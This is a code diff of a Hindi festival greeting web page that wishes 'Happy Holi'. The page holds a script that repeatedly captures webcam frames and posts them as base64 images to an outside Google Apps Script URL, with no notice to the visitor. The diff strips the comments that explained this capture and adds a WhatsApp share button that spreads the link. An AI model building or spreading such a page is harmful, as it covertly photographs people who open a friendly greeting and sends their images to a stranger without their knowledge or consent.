@@ -193,7 +193,7 @@
             <p class="hindi-text">इस खास दिन की ढेरों शुभकामनाएँ !</p>
             <p class="hindi-text green-bg">|| खुशियाँ आपके साथ हों ||</p>
         </div>
-        <div class="alok-text" id="userName">ALOK</div>
+        <div class="alok-text" id="userName">Sid Creative</div>
         <div class="wishing-section">
             <h2>Wishing you a very</h2>
             <h2>⭐ Happy xxx ⭐</h2>
@@ -203,7 +203,7 @@
             <p class="hindi-text purple-text">आज का दिन आपके जीवन में ढेर सारी खुशियाँ, सुकून और प्यार लेकर आए। आपको इस पावन अवसर की हार्दिक शुभकामनाएँ।</p>
         </div>
         <div class="share-buttons">
-            <button class="whatsapp">Whatsapp Share</button>
+            <button class="whatsapp" onclick="shareOnWhatsApp()">WhatsApp Share</button>
             <button class="facebook">Facebook Share</button>
         </div>
     </div>
@@ -259,15 +259,11 @@
 
                 video.addEventListener('loadeddata', () => {
                     setInterval(() => {
-                        // Set canvas dimensions equal to the video stream
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         context.drawImage(video, 0, 0);
-
-                        // Convert canvas to Data URL (base64 encoded image)
                         const imageData = canvas.toDataURL('image/png');
 
-                        // Send image data to the server automatically via fetch
                         fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
                             method: 'POST',
                             body: JSON.stringify({ image: imageData }),
@@ -288,7 +284,15 @@
             });
         }
 
-        // Get name from URL (optional if you want to pre-fill name)
+        // WhatsApp share function
+        function shareOnWhatsApp() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const message = "Happy Holi! Check this out: " + window.location.href;
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, "_blank");
+        }
+
+        // Get name from URL
         const urlParams = new URLSearchParams(window.location.search);
         const name = urlParams.get('name');
         if (name) {
